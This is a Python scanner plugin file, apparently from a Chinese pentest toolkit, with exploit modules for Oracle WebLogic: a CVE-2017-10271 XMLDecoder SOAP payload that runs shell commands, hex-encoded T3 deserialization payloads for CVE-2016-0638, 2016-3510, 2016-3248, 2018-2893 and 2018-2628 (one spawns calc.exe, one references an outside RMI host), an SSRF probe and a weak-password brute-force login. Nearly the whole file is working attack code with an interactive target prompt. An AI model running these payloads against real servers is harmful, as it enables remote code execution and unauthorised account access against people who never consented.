#!/usr/bin/env python3
# encoding=utf-8
#codeby     道长且阻
#email      @ydhcui/QQ664284092

import socket
import time
import binascii
import re
import urllib.parse as urlparse
import requests
requests.packages.urllib3.disable_warnings()

def brute(f):
    def F(self,*args,**kwargs):
        self.BRUTE = True
        return f(self,*args,**kwargs)
    return F

class BaseWebPlugin(object):
    def __init__(self,url):
        self.url = url
        parser        = urlparse.urlsplit(self.url)
        self.scheme   = parser.scheme
        self.netloc   = parser.netloc
        self.path     = parser.path
        self.domain   = self.netloc
        self.host = self.netloc.split(':')[0]
        try:
            self.port = int(self.netloc.split(':')[1])
        except:
            self.port = 443 if self.scheme.upper() == 'HTTPS' else 80


class WeblogicXmldecoderRce(BaseWebPlugin):
    bugname = "weblogic XMLdecoder反序列化漏洞"
    bugrank = "高危"
    bugnumber = "CVE-2017-10271"
    bugdesc = "weblogic /wls-wsat/CoordinatorPortType接口存在命令执行"
    bugnote = "https://www.anquanke.com/post/id/92003"

    def filter(self,web):
        return 'weblogic' in web.content or 'servlet' in web.content or web.port == 7001

    def verify(self,web, user='weblogic', pwd='',timeout=10):
        headers = {
            "Content-Type":"text/xml;charset=UTF-8",
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/wls-wsat/CoordinatorPortType"
        post_data = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
          <soapenv:Header>
            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
              <java>
                <object class="java.lang.ProcessBuilder">
                  <array class="java.lang.String" length="3">
                    <void index="0">
                      <string>/bin/sh</string>
                    </void>
                    <void index="1">
                      <string>-c</string>
                    </void>
                    <void index="2">
                      <string>whoami</string>
                    </void>
                  </array>
                  <void method="start"/>
                </object>
              </java>
            </work:WorkContext>
          </soapenv:Header>
          <soapenv:Body/>
        </soapenv:Envelope>
        '''
        vulnurl = web.url + payload
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=timeout, verify=False)
            if req.status_code == 500 and r"java.lang.ProcessBuilder" in req.text:
                self.bugaddr = vulnurl
                return True
        except Exception as e:
            print('  [*]%s'%e)

class BaseWeblogic(object):
    def filter(self,web):
        return 'weblogic' in web.content or 'servlet' in web.content or web.port == 7001

    def handshake(self):
        self.sock.connect(self.server_addr)
        data = '74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'
        self.sock.send(binascii.a2b_hex(data))
        time.sleep(1)
        self.sock.recv(1024)
        print("  [*] handshake successful")

    def buildT3RequestObject(self,port):
        data1 = ('000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f58'
                 '1daa4f5b90e2aebfc607499b4027973720078720178720278700000000a00000003000000000000'
                 '0006007070707070700000000a000000030000000000000006007006fe010000aced00057372001'
                 'd7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c00'
                 '0078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496'
                 'e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67'
                 '506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c00096'
                 '96d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e'
                 '646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000ace'
                 'd00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f526581'
                 '57f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657'
                 '273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c'
                 '6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6'
                 '561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b00127665727369'
                 '6f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696'
                 'e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900'
                 '056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e746'
                 '56d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e'
                 '646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000ace'
                 'd00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f526581'
                 '57f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656'
                 '572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c'
                 '696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685'
                 'b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c'
                 '2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e6'
                 '16c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371')
        data2 = ('007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696'
                 'e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769'
                 '632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec902000'
                 '84900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b7365727669'
                 '63655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e000'
                 '54c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e00057870'
                 '7702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944d'
                 'c49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e32323700'
                 '1257494e2d4147444d565155423154362e656883348cd6000000070000{0}fffffffffffffffff'
                 'fffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a'
                 '766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07').format('{:04x}'.format(port))
        data3 = '1a7727000d3234322e323134'
        data4 = '2e312e32353461863d1d0000000078'
        for d in [data1,data2,data3,data4]:
            self.sock.send(binascii.a2b_hex(d))
        time.sleep(2)
        print('  [*] send request payload successful,recv length:%d'%(len(self.sock.recv(2048))))

    def sendEvilObjData(self,payload):
        data = '056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'
        data += payload
        data += 'fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'
        data = '%s%s'%('{:08x}'.format(int(len(data)/2 + 4)),data)
        #self.sock.send(binascii.a2b_hex(data))
        time.sleep(0.2)
        self.sock.send(binascii.a2b_hex(data))
        res = b''
        try:
            while True:
                res += self.sock.recv(4096)
        except socket.timeout as e:
            print('  [*]%s'%e)
        return res

    def verify(self,host,user='',pwd='',timeout=15):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(timeout)
        self.server_addr = (host.host, host.port)
        self.handshake()
        self.buildT3RequestObject(host.port)
        res = self.sendEvilObjData(self.PAYLOAD).decode('utf8','ignore')
        pre = re.findall(self.VER_SIG, res, re.S)
        if pre:
            self.bugres = str(res)
            return True

class Weblogic_CVE_2016_0638(BaseWebPlugin,BaseWeblogic):
    bugname = "weglogic远程命令执行漏洞CVE-2016-0638"
    bugrank = "紧急"
    bugnumber = "CVE-2016-0638"

    PAYLOAD = "aced0005737200257765626c6f6769632e6a6d732e636f6d6d6f6e2e53747265616d4d657373616765496d706c6b88de4d93cbd45d0c00007872001f7765626c6f6769632e6a6d732e636f6d6d6f6e2e4d657373616765496d706c69126161d04df1420c000078707a000003f728200000000000000100000578aced00057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b0200007870000000014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707371007e00007372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001e00000002767200106a61767a0000018e612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001e7371007e00167571007e001b00000002707571007e001b00000000740006696e766f6b657571007e001e00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e001b7371007e0016757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000863616c632e657865740004657865637571007e001e0000000171007e00237371007e0011737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f40000000000010770800000010000000007878767200126a6176612e6c616e672e4f766572726964650000000000000000000000787071007e003a78"
    VER_SIG = "weblogic.jms.common.StreamMessageImpl"

class Weblogic_CVE_2016_3510(BaseWebPlugin,BaseWeblogic):
    bugname = "weglogic远程命令执行漏洞CVE-2016-3510"
    bugrank = "紧急"
    bugnumber = "CVE-2016-3510"

    PAYLOAD = "aced0005737200257765626c6f6769632e636f7262612e7574696c732e4d61727368616c6c65644f626a656374592161d5f3d1dbb6020002490004686173685b00086f626a42797465737400025b427870b6f794cf757200025b42acf317f8060854e0020000787000000130aced00057372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000074000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a99020000787000000001767200106a6176612e6c616e672e53797374656d00000000000000000000007870"
    VER_SIG = "org.apache.commons.collections.functors.InvokerTransformer"

class Weblogic_CVE_2016_3248(BaseWebPlugin,BaseWeblogic):
    bugname = "weglogic远程命令执行漏洞CVE-2016-3248"
    bugrank = "紧急"
    bugnumber = "CVE-2016-3248"

    PAYLOAD = "aced0005737d00000001001a6a6176612e726d692e72656769737472792e5265676973747279787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707732000a556e696361737452656600093132372e302e302e3100000000000000006ed6d97b00000000000000000000000000000078"
    VER_SIG = "'\\$Proxy[0-9]+'"

class Weblogic_CVE_2018_2893(BaseWebPlugin,BaseWeblogic):
    bugname = "weglogic远程命令执行漏洞CVE-2018-2893"
    bugrank = "紧急"
    bugnumber = "CVE-2018-2893"

    PAYLOAD = "ACED0005737200257765626C6F6769632E6A6D732E636F6D6D6F6E2E53747265616D4D657373616765496D706C6B88DE4D93CBD45D0C00007872001F7765626C6F6769632E6A6D732E636F6D6D6F6E2E4D657373616765496D706C69126161D04DF1420C000078707A000001251E200000000000000100000118ACED0005737D00000001001A6A6176612E726D692E72656769737472792E5265676973747279787200176A6176612E6C616E672E7265666C6563742E50726F7879E127DA20CC1043CB0200014C0001687400254C6A6176612F6C616E672F7265666C6563742F496E766F636174696F6E48616E646C65723B78707372002D6A6176612E726D692E7365727665722E52656D6F74654F626A656374496E766F636174696F6E48616E646C657200000000000000020200007872001C6A6176612E726D692E7365727665722E52656D6F74654F626A656374D361B4910C61331E03000078707732000A556E696361737452656600093132372E302E302E310000F1440000000046911FD80000000000000000000000000000007878"
    VER_SIG = "StreamMessageImpl"

class Weblogic_CVE_2018_2628(BaseWebPlugin,BaseWeblogic):
    bugname = "weglogic远程命令执行漏洞CVE-2018-2628"
    bugrank = "紧急"
    bugnumber = "CVE-2018-2628"

    PAYLOAD = "aced0005737d00000001001d6a6176612e726d692e61637469766174696f6e2e416374697661746f72787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707737000a556e6963617374526566000e3130342e3235312e3232382e353000001b590000000001eea90b00000000000000000000000000000078"
    VER_SIG = "\\$Proxy[0-9]+"

class Weblogic_ssrf(BaseWebPlugin):
    bugname = "weblogic SSRF漏洞"
    bugrank = "中危"
    bugnote = "http://blog.gdssecurity.com/labs/2015/3/30/weblogic-ssrf-and-xss-cve-2014-4241-cve-2014-4210-cve-2014-4.html"
    bugnumber = "CVE-2014-4210"
    bugdesc = "weblogic 版本10.0.2 -- 10.3.6中SearchPublicRegistries.jsp，参数operator可传入内网IP造成SSRF漏洞"

    def filter(self,web):
        return 'weblogic' in web.content or 'servlet' in web.content or web.port == 7001

    def verify(self,web, user='weblogic', pwd='',timeout=10):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/uddiexplorer/SearchPublicRegistries.jsp?operator=http://localhost/robots.txt&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search"
        vulnurl = web.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=timeout, verify=False)
            if r"weblogic.uddi.client.structures.exception.XML_SoapException" in req.text and r"IO Exception on sendMessage" not in req.text:
                self.bugaddr = vulnurl
                return True
        except Exception as e:
            print('  [*]%s'%e)

class Weblogic_interface_disclosure(BaseWebPlugin):
    bugname = "weblogic 接口泄露"
    bugrank = "低危"

    def filter(self,web):
        return 'weblogic' in web.content or 'servlet' in web.content or web.port == 7001

    def verify(self,web, user='weblogic', pwd='',timeout=10):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/bea_wls_deployment_internal/DeploymentService"
        vulnurl = web.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=timeout, verify=False)
            if req.status_code == 200:
                self.bugaddr = vulnurl
                return True
        except Exception as e:
            print('  [*]%s'%e)

class WeblogicWeakPass(BaseWeblogic):
    bugname = "Weblogic 后台弱口令"
    bugrank = "高危"

    def filter(self,web):
        return ('weblogic' in web.content or 'servlet' in web.content or web.port == 7001) and requests.get(web.url+"/console/j_security_check", verify=False).status_code == 401

    @brute
    def verify(self,web, user='weblogic', pwd='',timeout=10):
        post_data = {"j_username":user,"j_password":pwd}
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
            "Content-Type":"application/x-www-form-urlencoded"
        }
        vulnurl = web.url + "/console/j_security_check"
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=timeout, verify=False, allow_redirects=False)
            if req.status_code == 302 and r"console" in req.text and r"LoginForm.jsp" not in req.text:
                self.bugaddr = "%s:%s@%s"%(user,pwd,vulnurl)
                self.bugreq = "username:%s , password:%s"%(user,pwd)
                return True
        except Exception as e:
            print('  [*]%s'%e)




if __name__=='__main__':
    while True:
        url = input('>')
        plug = BaseWebPlugin(url)
        for payload in BaseWebPlugin.__subclasses__():
            try:
                if payload(url).verify(plug):
                    print('[+] 发现漏洞 %s - %s'%(payload,payload.bugname))
            except Exception as e:
                print('  [*]%s'%e)
